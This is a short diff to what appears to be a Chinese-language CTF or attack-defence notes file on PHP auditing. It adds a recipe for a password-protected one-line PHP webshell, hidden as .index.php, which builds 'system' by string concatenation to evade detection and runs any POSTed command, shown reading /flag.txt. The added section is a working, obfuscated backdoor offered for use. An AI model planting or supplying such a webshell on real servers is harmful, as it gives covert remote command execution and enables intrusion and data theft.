@@ -1,3 +1,14 @@
+## 先准备一款只能被自己利用的一句话，如md5加密的马子
+```
+root@kali:/tmp/2/html# echo -n v5est0r|md5sum
+10972d718c21fdc8718efbaa8e67740e  -
+
+vi .index.php
+<?php $a="s"."y"."st"."em";if (md5($_POST[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_POST[1]);}?>
+
+POST:2=v5est0r&1=cat /flag.txt
+```
+
 ## php代码审计常用函数
 
 ##### 1) 文件读取/写入
